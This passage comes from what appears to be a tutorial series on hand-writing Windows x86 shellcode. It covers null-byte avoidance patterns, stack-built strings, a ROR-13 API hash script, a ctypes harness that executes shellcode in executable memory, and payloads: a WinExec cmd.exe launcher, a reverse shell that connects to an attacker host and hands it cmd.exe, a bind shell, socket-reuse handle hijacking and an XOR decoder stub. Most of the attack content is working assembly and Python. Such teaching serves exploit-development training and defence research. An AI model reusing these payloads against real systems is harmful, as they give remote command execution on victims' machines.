  <text x="375" y="78" text-anchor="middle" fill="#cdd6f4" font-size="10">[+0x18] NumberOfNames   [+0x1C] AddrOfFunctions</text>
  <text x="375" y="92" text-anchor="middle" fill="#cdd6f4" font-size="10">[+0x20] AddrOfNames   [+0x24] AddrOfNameOrdinals</text>
  <text x="100" y="128" text-anchor="middle" fill="#89b4fa" font-size="12" font-weight="bold">AddressOfNames</text>
  <rect x="30" y="152" width="140" height="28" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
  <text x="100" y="171" text-anchor="middle" fill="#cdd6f4" font-size="11">[0] "AddAtomA"</text>
  <rect x="30" y="183" width="140" height="28" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
  <text x="100" y="202" text-anchor="middle" fill="#6c7086" font-size="11">...</text>
  <rect x="30" y="214" width="140" height="28" rx="3" fill="#313244" stroke="#f38ba8" stroke-width="2.5"/>
  <text x="100" y="233" text-anchor="middle" fill="#f38ba8" font-size="11" font-weight="bold">[n] "LoadLibraryA"</text>
  <text x="375" y="128" text-anchor="middle" fill="#fab387" font-size="12" font-weight="bold">AddressOfNameOrdinals</text>
  <rect x="305" y="152" width="140" height="28" rx="3" fill="#313244" stroke="#fab387" stroke-width="1"/>
  <text x="375" y="171" text-anchor="middle" fill="#cdd6f4" font-size="11">[0] ordinal: 2</text>
  <rect x="305" y="183" width="140" height="28" rx="3" fill="#313244" stroke="#fab387" stroke-width="1"/>
  <text x="375" y="202" text-anchor="middle" fill="#6c7086" font-size="11">...</text>
  <rect x="305" y="214" width="140" height="28" rx="3" fill="#313244" stroke="#f38ba8" stroke-width="2.5"/>
  <text x="375" y="233" text-anchor="middle" fill="#f38ba8" font-size="11" font-weight="bold">[n] ordinal: 831</text>
  <text x="640" y="128" text-anchor="middle" fill="#a6e3a1" font-size="12" font-weight="bold">AddressOfFunctions</text>
  <rect x="570" y="152" width="140" height="28" rx="3" fill="#313244" stroke="#a6e3a1" stroke-width="1"/>
  <text x="640" y="171" text-anchor="middle" fill="#cdd6f4" font-size="11">[0] RVA 0x01A2F0</text>
  <rect x="570" y="183" width="140" height="28" rx="3" fill="#313244" stroke="#a6e3a1" stroke-width="1"/>
  <text x="640" y="202" text-anchor="middle" fill="#6c7086" font-size="11">...</text>
  <rect x="570" y="214" width="140" height="28" rx="3" fill="#313244" stroke="#f38ba8" stroke-width="2.5"/>
  <text x="640" y="233" text-anchor="middle" fill="#f38ba8" font-size="11" font-weight="bold">[831] RVA 0x15C40</text>
  <line x1="170" y1="228" x2="305" y2="228" stroke="#f38ba8" stroke-width="2.5" marker-end="url(#arwR)"/>
  <rect x="198" y="209" width="95" height="18" rx="3" fill="#1e1e2e"/>
  <text x="245" y="223" text-anchor="middle" fill="#f38ba8" font-size="11" font-weight="bold">Step 1: index n</text>
  <line x1="445" y1="228" x2="570" y2="228" stroke="#f38ba8" stroke-width="2.5" marker-end="url(#arwR)"/>
  <rect x="460" y="209" width="100" height="18" rx="3" fill="#1e1e2e"/>
  <text x="510" y="223" text-anchor="middle" fill="#f38ba8" font-size="11" font-weight="bold">Step 2: ord 831</text>
  <rect x="180" y="290" width="390" height="60" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
  <text x="375" y="313" text-anchor="middle" fill="#a6e3a1" font-size="13" font-weight="bold">Resolution Complete</text>
  <text x="375" y="333" text-anchor="middle" fill="#cdd6f4" font-size="11">Function RVA + DLL Base Address = Final Virtual Address</text>
  <text x="375" y="348" text-anchor="middle" fill="#f38ba8" font-size="12">EAX = kernel32_base + AddressOfFunctions[831]</text>
  <line x1="640" y1="242" x2="560" y2="300" stroke="#a6e3a1" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arwG)"/>
</svg></div>

*Figure 4.2 - The PE Export Table uses three parallel arrays. We hash each name in AddressOfNames until we find a match, use that same index to read the ordinal from AddressOfNameOrdinals, then use the ordinal as an index into AddressOfFunctions to get the function's RVA.*

These three capabilities -- skeleton, PEB walk, and API resolution -- are the foundation for everything that follows. Before we write our first payload, though, we need a toolkit of building-block techniques.

---

## 5. Null-Free Encoding Patterns

The single hardest constraint in shellcode writing is not size or complexity -- it is **bad characters**. The most common offender is `0x00`, the null byte. Here is a catalog of the patterns we will use throughout this series.

### Pattern 1: XOR Zeroing

Instead of `mov eax, 0` (which assembles as `B8 00 00 00 00`), we write:

```nasm
xor   eax, eax             ; EAX = 0, assembles as 31 C0 (two bytes, no nulls)
```

### Pattern 2: Two's Complement (ADD Instead of SUB)

```nasm
; Instead of: sub esp, 0x610  (contains null bytes)
add   esp, 0xfffff9f0       ; Same result: ESP - 0x610
```

The formula: `two's_complement(X) = NOT(X) + 1`.

### Pattern 3: NOT Encoding

```nasm
; We need 0x00000100 (STARTF_USESTDHANDLES) -- full of nulls
push  0xfffffeff            ; NOT(0x00000100) = 0xFFFFFEFF
pop   eax
not   eax                   ; EAX = 0x00000100
push  eax
```

### Pattern 4: NEG for Small Byte Values

```nasm
mov   al, 0xFA              ; 0x100 - 0x06 = 0xFA (allowed)
neg   al                    ; AL = 0x06
```

### Pattern 5: INC/DEC Chains

```nasm
xor   eax, eax              ; EAX = 0
inc   eax                   ; EAX = 1
inc   eax                   ; EAX = 2 (AF_INET)
```

### Pattern 6: Shift-Based Construction

```nasm
xor   eax, eax              ; EAX = 0x00000000
mov   al, 0xBB              ; EAX = 0x000000BB
shl   eax, 0x08             ; EAX = 0x0000BB00
inc   eax                   ; EAX = 0x0000BB01 (port 443 in NBO)
```

### Pattern 7: XOR with a Key

```nasm
mov   eax, 0x5551F890       ; Encoded value
xor   eax, 0x50505050       ; Key
; Result: 0x0501A8C0 = 192.168.1.5 in little-endian
```

> These patterns are composable. A single value might require a shift, a NOT, and an INC. The more patterns you internalize, the faster you can adapt to any bad character set.

---

## 6. Building Strings on the Stack

Shellcode needs strings constantly: DLL names, command lines, file paths, registry keys. Every string must be constructed at runtime on the stack.

### The DWORD Push Pattern

Break the string into 4-byte chunks, convert each to a little-endian DWORD, and push them in reverse order. Let us build `"cmd.exe"`:

```
String:      c    m    d    .    e    x    e    \0
ASCII hex:   63   6d   64   2e   65   78   65   00
```

Group into DWORDs:

```
DWORD 1: "cmd." = 0x2e646d63
DWORD 2: "exe\0" = 0x00657865  (contains null!)
```

Fix with zero-extend:

```nasm
xor   eax, eax              ; EAX = 0x00000000
mov   eax, 0x657865         ; EAX = 0x00657865 (high byte stays zero)
push  eax                   ; Push "exe\0"
push  0x2e646d63            ; Push "cmd."
mov   esi, esp              ; ESI -> "cmd.exe\0"
```

### The SHL/MOV AL Trick

```nasm
xor   eax, eax              ; EAX = 0
mov   ax, 0x6c6c            ; AX = "ll"
shl   eax, 0x08             ; EAX = 0x006c6c00
mov   al, 0x64              ; AL = 'd' -> EAX = 0x006c6c64 = "dll\0"
push  eax
```

This builds `"dll\0"` byte by byte. We will see this pattern repeatedly when building DLL name strings.

---

## 7. The ROR-13 Hash Generator

Our `find_function` engine identifies Windows API functions by comparing 32-bit hashes. Here is the Python utility that produces them.

### Python Implementation

```python
import sys

def ror13_hash(name):
    """Compute the ROR-13 hash of a function name."""
    h = 0
    for ch in name:
        h = ((h >> 13) | (h << (32 - 13))) & 0xFFFFFFFF
        h = (h + ord(ch)) & 0xFFFFFFFF
    return h

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python hash.py FunctionName [FunctionName ...]")
        sys.exit(1)

    for name in sys.argv[1:]:
        h = ror13_hash(name)
        print(f"  {name:30s} -> 0x{h:08x}")
```

Running it:

```
$ python hash.py LoadLibraryA CreateProcessA ExitProcess WSAStartup WSASocketA connect
  LoadLibraryA                   -> 0xec0e4e8e
  CreateProcessA                 -> 0x16b3fe72
  ExitProcess                    -> 0x73e2d87e
  WSAStartup                     -> 0x3bfcedcb
  WSASocketA                     -> 0xadf509d9
  connect                        -> 0x60aaf9ec
```

These are the exact values we embed as immediates in our shellcode.

> **Important:** The hash algorithm in your shellcode and in your Python script must be identical. If you split the rotation for bad character avoidance (e.g., `ror edx, 7` + `ror edx, 6` instead of `ror edx, 13`), the total rotation is still 13, so the hashes remain the same.

---

## 8. Testing Shellcode -- Keystone and ctypes

### Assembling with Keystone

```python
from keystone import Ks, KS_ARCH_X86, KS_MODE_32

CODE = """
start:
    mov   ebp, esp
    add   esp, 0xfffff9f0
    ; ... rest of shellcode ...
"""

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
shellcode = bytes(encoding)
print(f"[+] Assembled {count} instructions, {len(shellcode)} bytes")
```

### Bad Character Scanner

```python
BAD_CHARS = set([0x00, 0x0a, 0x0d])

def check_bad_chars(shellcode, bad_chars):
    found = []
    for i, b in enumerate(shellcode):
        if b in bad_chars:
            found.append((i, b))
    if found:
        print("[!] Bad characters found:")
        for offset, byte in found:
            print(f"    Offset 0x{offset:04x}: 0x{byte:02x}")
    else:
        print("[+] No bad characters found!")
    return found
```

### Executing with ctypes

```python
import ctypes

MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40
ptr = ctypes.windll.kernel32.VirtualAlloc(
    0, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE
)
ctypes.windll.msvcrt.memcpy(ptr, shellcode, len(shellcode))
shellcode_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(ctypes.c_void_p))
shellcode_func()
```

### Debugging with WinDbg

Insert `int3` at the start. Launch under WinDbg. Key commands: `t` (step), `r` (registers), `dd esp` (dump stack), `db esi` (display bytes), `u eip L20` (disassemble).

> **Development cycle:** Edit assembly, run Keystone, scan for bad chars, execute with ctypes, debug in WinDbg. Each iteration takes under a minute.

With our toolkit complete, we are ready to write real payloads.

---

## 9. Your First Shellcode -- WinExec

Everything we have built so far -- the PEB walk, the export table parser, the ROR-13 hash resolver -- has been infrastructure. Now we put it all to work and write shellcode that actually *does* something: pop a command shell with `WinExec`.

### The Game Plan

We resolve three functions from kernel32.dll, stashing each at a known EBP offset:

```nasm
resolve_symbols_kernel32:
    push  0x78b5b983            ; TerminateProcess hash
    call  dword ptr [ebp+0x04]  ; find_function
    mov   [ebp+0x10], eax       ; save TerminateProcess

    push  0xec0e4e8e            ; LoadLibraryA hash
    call  dword ptr [ebp+0x04]  ; find_function
    mov   [ebp+0x14], eax       ; save LoadLibraryA

    push  0x0e8afe98            ; WinExec hash
    call  dword ptr [ebp+0x04]  ; find_function
    mov   [ebp+0x18], eax       ; save WinExec
```

### Building "cmd.exe" and Calling WinExec

```nasm
call_winexec:
    xor   eax, eax             ; EAX = 0
    mov   eax, 0x657865        ; EAX = 0x00657865 = "exe\0"
    push  eax
    push  0x2e646d63           ; push "cmd."
    mov   esi, esp             ; ESI -> "cmd.exe\0"

    xor   eax, eax
    mov   eax, 0x5             ; uCmdShow = SW_SHOW (5)
    push  eax
    push  esi                  ; pointer to "cmd.exe"
    call  dword ptr [ebp+0x18]; call WinExec
```

That is it. When this shellcode runs, a `cmd.exe` window appears. Roughly 120 bytes of machine code.

---

## 10. Reverse Shell -- Calling Home

A **reverse shell** is the workhorse of remote exploitation. The target reaches out to a listener the attacker already has running, punching through firewalls that block inbound connections.

The high-level flow:

1. Load `ws2_32.dll` (Winsock)
2. Initialize Winsock with `WSAStartup`
3. Create a TCP socket with `WSASocketA`
4. Connect back to the attacker with `connect`
5. Build a `STARTUPINFOA` that redirects stdin/stdout/stderr to the socket
6. Spawn `cmd.exe` with `CreateProcessA`

### Loading ws2_32.dll and Resolving Winsock Functions

```nasm
load_ws2_32:
    xor   eax, eax
    push  eax                  ; null terminator
    xor   eax, eax
    mov   ax, 0x6c6c
    push  eax                  ; "ll\0\0"
    push  0x642e3233           ; "32.d"
    push  0x5f327377           ; "ws2_"
    push  esp
    call  dword ptr [ebp+0x08] ; LoadLibraryA("ws2_32.dll")
    mov   ebx, eax             ; save ws2_32 base in EBX
```

### Building sockaddr_in with NOT Encoding

```nasm
    xor   eax, eax
    push  eax                   ; sin_zero padding
    push  eax
    push  0x0101a8c0            ; sin_addr = 192.168.1.1 (little-endian)

    ; Encode 0xBB010002 without null bytes
    push  0x44fefffd            ; NOT(0xBB010002)
    pop   eax
    not   eax                   ; EAX = 0xBB010002
    push  eax                   ; sin_port (443) + sin_family (AF_INET)
    mov   esi, esp              ; ESI -> sockaddr_in
```

### STARTUPINFOA -- Redirecting stdio to the Socket

The critical fields: `dwFlags = 0x100` (STARTF_USESTDHANDLES), and `hStdInput/hStdOutput/hStdError` all set to the socket handle. This is what makes the shell interactive over the network.

```nasm
    push  dword ptr [ebp+0x20] ; hStdError  = SOCKET
    push  dword ptr [ebp+0x20] ; hStdOutput = SOCKET
    push  dword ptr [ebp+0x20] ; hStdInput  = SOCKET
    push  ecx                   ; lpReserved2 = NULL
    push  ecx                   ; wShowWindow + cbReserved2

    push  0xfffffeff            ; NOT(0x100)
    pop   eax
    not   eax                   ; EAX = STARTF_USESTDHANDLES
    push  eax                   ; dwFlags
```

> `bInheritHandles = TRUE` in CreateProcessA is non-negotiable. Without it, the child process does not inherit the socket handle, and the stdio redirect silently fails.

<div align="center"><svg viewBox="0 0 750 420" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
<defs>
  <marker id="arrow-g" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker>
  <marker id="arrow-o" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#fab387"/></marker>
</defs>
<rect width="750" height="420" rx="8" fill="#1e1e2e"/>
<text x="375" y="30" text-anchor="middle" fill="#cdd6f4" font-size="16" font-weight="bold">Reverse Shell Architecture</text>
<rect x="30" y="60" width="200" height="130" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
<text x="130" y="85" text-anchor="middle" fill="#cdd6f4" font-size="13" font-weight="bold">ATTACKER</text>
<text x="130" y="108" text-anchor="middle" fill="#fab387" font-size="11">192.168.1.1:443</text>
<text x="130" y="130" text-anchor="middle" fill="#cdd6f4" font-size="11">nc -lvnp 443</text>
<text x="130" y="155" text-anchor="middle" fill="#a6e3a1" font-size="11">LISTENING...</text>
<rect x="520" y="60" width="200" height="130" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
<text x="620" y="85" text-anchor="middle" fill="#cdd6f4" font-size="13" font-weight="bold">TARGET</text>
<text x="620" y="108" text-anchor="middle" fill="#fab387" font-size="11">Exploited Process</text>
<text x="620" y="130" text-anchor="middle" fill="#cdd6f4" font-size="11">Shellcode runs:</text>
<text x="620" y="150" text-anchor="middle" fill="#a6e3a1" font-size="10">WSAStartup, WSASocketA</text>
<text x="620" y="165" text-anchor="middle" fill="#a6e3a1" font-size="10">connect() --></text>
<line x1="520" y1="125" x2="240" y2="125" stroke="#a6e3a1" stroke-width="2" marker-end="url(#arrow-g)" stroke-dasharray="8,4"/>
<text x="375" y="115" text-anchor="middle" fill="#a6e3a1" font-size="11">TCP connect()</text>
<rect x="520" y="230" width="200" height="80" rx="6" fill="#313244" stroke="#fab387" stroke-width="2"/>
<text x="620" y="255" text-anchor="middle" fill="#cdd6f4" font-size="13" font-weight="bold">cmd.exe</text>
<text x="620" y="275" text-anchor="middle" fill="#cdd6f4" font-size="11">CreateProcessA()</text>
<text x="620" y="295" text-anchor="middle" fill="#fab387" font-size="10">inherits socket handle</text>
<line x1="620" y1="190" x2="620" y2="225" stroke="#fab387" stroke-width="2" marker-end="url(#arrow-o)"/>
<rect x="275" y="240" width="200" height="100" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/>
<text x="375" y="262" text-anchor="middle" fill="#f38ba8" font-size="12" font-weight="bold">STARTUPINFOA</text>
<text x="375" y="282" text-anchor="middle" fill="#cdd6f4" font-size="10">hStdInput  = SOCKET</text>
<text x="375" y="297" text-anchor="middle" fill="#cdd6f4" font-size="10">hStdOutput = SOCKET</text>
<text x="375" y="312" text-anchor="middle" fill="#cdd6f4" font-size="10">hStdError  = SOCKET</text>
<text x="375" y="330" text-anchor="middle" fill="#f38ba8" font-size="10">dwFlags = 0x100</text>
<line x1="275" y1="280" x2="130" y2="195" stroke="#a6e3a1" stroke-width="2" marker-end="url(#arrow-g)"/>
<text x="375" y="390" text-anchor="middle" fill="#cdd6f4" font-size="12">Attacker types commands -> socket -> cmd.exe stdin</text>
<text x="375" y="408" text-anchor="middle" fill="#cdd6f4" font-size="12">cmd.exe stdout -> socket -> attacker sees output</text>
</svg></div>

*Figure 10.1 - Reverse shell data flow: the target connects out to the attacker, and STARTUPINFOA redirects all stdio through the socket*

---

## 11. Bind Shell -- Waiting for Connections

A **bind shell** is the mirror image of a reverse shell. Instead of connecting out, the shellcode opens a port on the target and waits for the attacker to connect in.

The bind shell trades `connect` for three new functions: `bind`, `listen`, and `accept`. It also uses `WaitForSingleObject` to keep the shellcode alive.

### The rep stosb Zeroing Technique

```nasm
zero_structs:
    xor   eax, eax         ; AL = 0
    xor   ecx, ecx
    mov   cl, 0x44          ; ECX = 68
    sub   esp, ecx
    mov   edi, esp
    push  ecx
    rep   stosb             ; Zero 68 bytes
    pop   ecx
    sub   edi, ecx          ; Reset EDI to start
```

> `rep stosb` is significantly more compact than pushing 17 individual zero DWORDs.

### Key Difference: Two Socket Handles

> **Critical detail:** `accept` returns a *new* socket handle for the connected client. This is the handle we use for the STARTUPINFOA stdio redirect -- not the original listening socket. Using the wrong socket is a common mistake.

<div align="center"><svg viewBox="0 0 750 380" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
<defs>
  <marker id="ba-g" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker>
  <marker id="ba-o" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#fab387"/></marker>
</defs>
<rect width="750" height="380" rx="8" fill="#1e1e2e"/>
<text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="16" font-weight="bold">Bind Shell Flow</text>
<rect x="30" y="55" width="130" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
<text x="95" y="75" text-anchor="middle" fill="#89b4fa" font-size="11" font-weight="bold">1. bind()</text>
<text x="95" y="92" text-anchor="middle" fill="#cdd6f4" font-size="9">0.0.0.0:4444</text>
<line x1="160" y1="82" x2="185" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#ba-g)"/>
<rect x="190" y="55" width="130" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
<text x="255" y="75" text-anchor="middle" fill="#89b4fa" font-size="11" font-weight="bold">2. listen()</text>
<text x="255" y="92" text-anchor="middle" fill="#cdd6f4" font-size="9">backlog = 1</text>
<line x1="320" y1="82" x2="345" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#ba-g)"/>
<rect x="350" y="55" width="130" height="55" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
<text x="415" y="75" text-anchor="middle" fill="#f38ba8" font-size="11" font-weight="bold">3. accept()</text>
<text x="415" y="92" text-anchor="middle" fill="#cdd6f4" font-size="9">BLOCKS here</text>
<line x1="480" y1="82" x2="505" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#ba-g)"/>
<rect x="510" y="55" width="130" height="55" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
<text x="575" y="75" text-anchor="middle" fill="#a6e3a1" font-size="11" font-weight="bold">4. Spawn shell</text>
<text x="575" y="92" text-anchor="middle" fill="#cdd6f4" font-size="9">CreateProcessA</text>
<rect x="280" y="145" width="190" height="55" rx="6" fill="#313244" stroke="#fab387" stroke-width="2"/>
<text x="375" y="165" text-anchor="middle" fill="#fab387" font-size="11" font-weight="bold">ATTACKER connects in</text>
<text x="375" y="182" text-anchor="middle" fill="#cdd6f4" font-size="10">nc 192.168.1.5 4444</text>
<line x1="375" y1="145" x2="415" y2="115" stroke="#fab387" stroke-width="1.5" stroke-dasharray="6,3" marker-end="url(#ba-o)"/>
<rect x="60" y="230" width="290" height="120" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
<text x="205" y="252" text-anchor="middle" fill="#89b4fa" font-size="12" font-weight="bold">Two Socket Handles</text>
<rect x="80" y="264" width="250" height="24" rx="3" fill="#1e1e2e" stroke="#fab387" stroke-width="1"/>
<text x="205" y="280" text-anchor="middle" fill="#fab387" font-size="10">listenSock (from WSASocketA)</text>
<rect x="80" y="296" width="250" height="24" rx="3" fill="#1e1e2e" stroke="#a6e3a1" stroke-width="1"/>
<text x="205" y="312" text-anchor="middle" fill="#a6e3a1" font-size="10">clientSock (from accept) --> used for stdio</text>
<text x="205" y="342" text-anchor="middle" fill="#f38ba8" font-size="10">Use clientSock, NOT listenSock!</text>
<rect x="400" y="230" width="310" height="120" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/>
<text x="555" y="252" text-anchor="middle" fill="#f38ba8" font-size="12" font-weight="bold">vs. Reverse Shell</text>
<text x="555" y="275" text-anchor="middle" fill="#cdd6f4" font-size="10">Reverse: connect() returns 0 on success.</text>
<text x="555" y="293" text-anchor="middle" fill="#cdd6f4" font-size="10">Uses SAME socket for everything.</text>
<text x="555" y="316" text-anchor="middle" fill="#cdd6f4" font-size="10">Bind: accept() returns a NEW socket.</text>
<text x="555" y="334" text-anchor="middle" fill="#cdd6f4" font-size="10">Must use the NEW one for stdio.</text>
</svg></div>

*Figure 11.1 - Bind shell sequence: bind to a port, listen, block on accept, then spawn a shell using the accepted client socket*

---

## 12. Working Under Restrictions -- A Case Study

What if the vulnerability filters out far more than just `0x00`? Real-world exploits often have extensive bad character lists. When half the byte range is off limits, every constant must be constructed indirectly.

The core encoding patterns for a restricted-charset reverse shell:

**NEG for small constants:** `mov al, 0xFA; neg al` produces `0x06` (IPPROTO_TCP).

**XOR for multi-byte values:** `mov eax, 0x5551F890; xor eax, 0x50505050` produces `0x0501A8C0` (an IP address).

**Shift chains for port numbers:** `mov al, 0xBB; shl eax, cl; inc eax` builds `0xBB01` (port 443 in NBO) one byte at a time.

**INC/DEC chains:** `xor eax, eax; inc eax; inc eax` builds AF_INET (2).

**Split ROR:** `ror edx, 0x07; ror edx, 0x06` replaces `ror edx, 0x0d` when `0x0D` is a bad character.

**Field-by-field struct construction:** Allocate space, then fill each field individually with `mov word/dword ptr`.

> The restricted-charset shellcode is not a separate technique -- it is the same shellcode with an encoding adapter wrapped around every constant.

With the networking payloads and encoding techniques covered, we now move into more advanced territory.

---

## 13. Socket Reuse -- Hijacking Existing Connections

Every shellcode technique so far creates a *new* network connection. **Socket reuse** sidesteps that by hijacking the very TCP socket the exploit already opened. No new connections, no new firewall rules to bypass.

### Handle Enumeration Strategy

We brute-force handle values from `0x50` to `0x400`, calling `getpeername()` on each. If it succeeds and the returned port matches ours, we have found our socket.

```nasm
call_getpeername:
    xor   eax, eax
    mov   al, 0x10                  ; namelen = 16
    push  eax
    mov   eax, esp                  ; EAX = &namelen
    push  eax                       ; Arg 3: &namelen
    push  dword ptr [ebp+0x28]     ; Arg 2: &sockaddr_in
    push  dword ptr [ebp+0x2C]     ; Arg 1: socket handle candidate
    call  dword ptr [ebp+0x24]     ; getpeername
    pop   ecx                       ; Clean namelen
    xor   edx, edx
    cmp   edx, eax                  ; Success (0)?
    jnz   loop_handle               ; Not a socket, try next

    ; Check port
    xor   eax, eax
    mov   ax, 0x5C11                ; Port 4444 in NBO
    mov   edi, dword ptr [ebp+0x28]
    cmp   word ptr [edi+0x02], ax   ; Compare sin_port
    jnz   loop_handle               ; Wrong port
```

<div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="background:#1e1e2e;border-radius:8px"><defs><marker id="ah13" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker></defs><text x="375" y="30" fill="#cdd6f4" font-family="Consolas,monospace" font-size="15" text-anchor="middle" font-weight="bold">Socket Reuse: Handle Enumeration</text><rect x="30" y="55" width="130" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="95" y="85" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11" text-anchor="middle">handle = 0x50</text><line x1="160" y1="80" x2="195" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah13)"/><rect x="200" y="55" width="165" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="282" y="76" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11" text-anchor="middle">getpeername(handle,</text><text x="282" y="92" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11" text-anchor="middle">&addr, &len)</text><line x1="365" y1="80" x2="395" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah13)"/><rect x="400" y="55" width="120" height="50" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/><text x="460" y="76" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Return != 0?</text><text x="460" y="92" fill="#f38ba8" font-family="Consolas,monospace" font-size="10" text-anchor="middle">Not a socket</text><line x1="520" y1="80" x2="555" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah13)"/><rect x="560" y="55" width="155" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="637" y="76" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11" text-anchor="middle">sin_port == 0x5C11?</text><text x="637" y="92" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">(port 4444)</text><rect x="220" y="145" width="310" height="55" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/><text x="375" y="170" fill="#a6e3a1" font-family="Consolas,monospace" font-size="12" text-anchor="middle" font-weight="bold">MATCH! Use handle for STARTUPINFOA</text><text x="375" y="188" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">All I/O flows through original exploit socket</text><line x1="637" y1="105" x2="530" y2="155" stroke="#a6e3a1" stroke-width="2"/><text x="600" y="135" fill="#a6e3a1" font-family="Consolas,monospace" font-size="10">YES</text></svg></div>

*Figure 13.1 - Socket reuse: scan handles, test with getpeername, match port, redirect stdio*

---

## 14. XOR Encoding -- Runtime Decoding

Manually avoiding bad characters one instruction at a time works for small payloads. For larger ones, **XOR encoding** transforms the entire payload so no bad characters remain, then decodes it at runtime.

### The Decoder Loop

```nasm
decode_loop:
    xor   byte ptr [esi], 0xAA     ; XOR current byte with key
    inc   esi                       ; Advance to next byte
    loop  decode_loop               ; Decrement ECX; jump if ECX != 0
```

The **`loop`** instruction decrements ECX by 1 and jumps if non-zero. After all iterations, the payload is restored to its original bytes.

### Key Selection Script

```python
for key in range(1, 256):
    if key in bad_chars:
        continue
    if all((b ^ key) not in bad_chars for b in payload):
        print(f"Valid key: 0x{key:02x}")
        break
```

<div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="background:#1e1e2e;border-radius:8px"><text x="375" y="30" fill="#cdd6f4" font-family="Consolas,monospace" font-size="15" text-anchor="middle" font-weight="bold">XOR Decode Loop (key = 0xAA)</text><text x="60" y="70" fill="#fab387" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Iter</text><text x="180" y="70" fill="#fab387" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Before</text><text x="340" y="70" fill="#fab387" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Operation</text><text x="510" y="70" fill="#fab387" font-family="Consolas,monospace" font-size="11" text-anchor="middle">After</text><rect x="20" y="85" width="710" height="38" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1"/><text x="60" y="109" fill="#a6e3a1" font-family="Consolas,monospace" font-size="13" text-anchor="middle">1</text><text x="180" y="109" fill="#f38ba8" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xD8</text><text x="340" y="109" fill="#cdd6f4" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xD8 XOR 0xAA</text><text x="510" y="109" fill="#a6e3a1" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x72 = 'r'</text><rect x="20" y="128" width="710" height="38" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1"/><text x="60" y="152" fill="#a6e3a1" font-family="Consolas,monospace" font-size="13" text-anchor="middle">2</text><text x="180" y="152" fill="#f38ba8" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xCF</text><text x="340" y="152" fill="#cdd6f4" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xCF XOR 0xAA</text><text x="510" y="152" fill="#a6e3a1" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x65 = 'e'</text><rect x="20" y="171" width="710" height="38" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1"/><text x="60" y="195" fill="#a6e3a1" font-family="Consolas,monospace" font-size="13" text-anchor="middle">3</text><text x="180" y="195" fill="#f38ba8" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xC7</text><text x="340" y="195" fill="#cdd6f4" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xC7 XOR 0xAA</text><text x="510" y="195" fill="#a6e3a1" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x6D = 'm'</text><rect x="20" y="214" width="710" height="38" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1"/><text x="60" y="238" fill="#a6e3a1" font-family="Consolas,monospace" font-size="13" text-anchor="middle">4</text><text x="180" y="238" fill="#f38ba8" font-family="Consolas,monospace" font-size="13" 